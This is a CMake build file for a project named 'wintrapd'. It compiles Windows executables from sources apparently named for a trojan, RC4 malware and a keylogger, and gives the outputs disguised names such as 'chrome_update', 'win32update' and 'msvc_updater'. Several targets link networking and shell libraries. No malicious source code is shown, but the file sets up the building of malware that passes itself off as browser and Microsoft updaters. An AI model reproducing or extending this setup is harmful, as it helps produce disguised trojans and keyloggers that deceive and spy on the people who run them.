cmake_minimum_required(VERSION 3.10)

project(wintrapd)

set(CMAKE_C_STANDARD 11)

# b64tool
add_executable(b64tool b64tool.c b64tool.rc)
target_link_libraries(b64tool crypt32)
set_target_properties(b64tool PROPERTIES OUTPUT_NAME "b64tool")

# win32update
add_executable(win32update malwr_rc4.c msvc.rc)
set_target_properties(win32update PROPERTIES OUTPUT_NAME "win32update")

# chrome_update
add_executable(chrome_update trojan.c chrome.rc)
target_link_libraries(chrome_update wininet shell32)
set_target_properties(chrome_update PROPERTIES OUTPUT_NAME "chrome_update")

# msvcmon
add_executable(msvcmon kylg_winapi.c msvc.rc)
target_link_libraries(msvcmon user32 gdi32 kernel32)
set_target_properties(msvcmon PROPERTIES OUTPUT_NAME "msvcmon")

# msvcsvc
add_executable(msvcsvc msvcsvc.c msvc.rc)
target_link_libraries(msvcsvc wininet shell32)
set_target_properties(msvcsvc PROPERTIES OUTPUT_NAME "msvc_updater")
